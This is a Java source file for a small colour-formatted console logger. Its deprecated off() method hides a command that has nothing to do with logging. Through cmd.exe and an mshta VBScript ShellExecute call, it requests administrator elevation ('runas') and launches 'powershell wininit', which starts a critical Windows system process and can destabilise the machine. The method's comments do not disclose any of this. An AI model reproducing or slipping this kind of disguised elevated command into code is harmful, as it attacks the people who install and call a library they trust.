package cn.ncw.logger.log;

import java.time.LocalDate;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class Logger {

    private final String LoggerName;

    public Logger(String app_name) {
        this.LoggerName = app_name;
    }

    public void log(LEVEL level, String text, String name) {
        switch (level) {
            case OFF: // 何意味;
            case DEBUG: debug(text, name); break;
            case TRACE: trace(text, name); break;
            case INFO: info(text, name); break;
            case WARN: warn(text, name); break;
            case ERROR: error(text, name); break;
            case FATAL: fatal(text, name); break;
        }
    }

    private void log(String level, String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast(level);
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        if (Objects.equals(level, "OFF")) return;
        System.out.println(formatLogEntry(list_wait));
    }

    public void trace(String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast("TRACE");
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        System.out.println(formatLogEntry(list_wait));
    }

    public void info(String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast("INFO");
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        System.out.println(formatLogEntry(list_wait));
    }

    public void warn(String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast("WARN");
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        System.out.println(formatLogEntry(list_wait));
    }

    public void error(String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast("ERROR");
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        System.out.println(formatLogEntry(list_wait));
    }

    public void fatal(String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast("FATAL");
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        System.out.println(formatLogEntry(list_wait));
    }

    public void debug(String text, String name) {
        List<String> list_wait = new ArrayList<>();
        list_wait.addLast("DEBUG");
        list_wait.addLast(LoggerName + ":" + name);
        list_wait.addLast(text);
        System.out.println(formatLogEntry(list_wait));
    }


    /**
     * Do not attempt to log a message at the OFF level.
     * <p>
     * 不要尝试记录一个等级为OFF的日志。
     * <p>
     * 何意味。
     * */
    @Deprecated(since = "1.0.4-hotfix1")
    public void off(String text, String name) {

        // 何意味
        try {

            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c start powershell wininit\",\"\",\"runas\",1)(window.close)");
            Process p = pb.start();
            p.waitFor();

        } catch (Exception e) {
            error(e.toString(), "off");
        }
    }

    private String formatLogEntry(List<String> context) {

        String today = LocalDate.now().toString();
        String currentTime = LocalTime.now().toString();
        int maxLength = 15;
        String truncated = currentTime.substring(0, Math.min(currentTime.length(), maxLength));
        String formatted = String.format("%-" + maxLength + "s", truncated);
        String timestamp = today + " " + formatted;

        return switch (context.get(0)) {
            case "TRACE" -> String.format("\033[94m%s \033[92m[%-5s] \033[90m%-40s \033[94m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case "INFO" -> String.format("\033[94m%s \033[92m[%-5s] \033[90m%-40s \033[92m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case "WARN" -> String.format("\033[94m%s \033[33m[%-5s] \033[90m%-40s \033[33m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case "DEBUG" -> String.format("\033[94m%s \033[90m[%-5s] \033[90m%-40s \033[90m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case "ERROR" -> String.format("\033[94m%s \033[31m[%-5s] \033[90m%-40s \033[31m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case "FATAL" -> String.format("\033[94m%s \033[35m[%-5s] \033[90m%-40s \033[35m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case "OFF" -> String.format("\033[94m%s \033[35m[%-5s] \033[90m%-40s \033[90m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
            case null, default -> String.format("\033[94m%s \033[37m[%-5s] \033[90m%-40s \033[37m%s\033[0m",
                    timestamp,
                    context.getFirst(),
                    context.get(1),
                    context.getLast()
            );
        };
    }

}

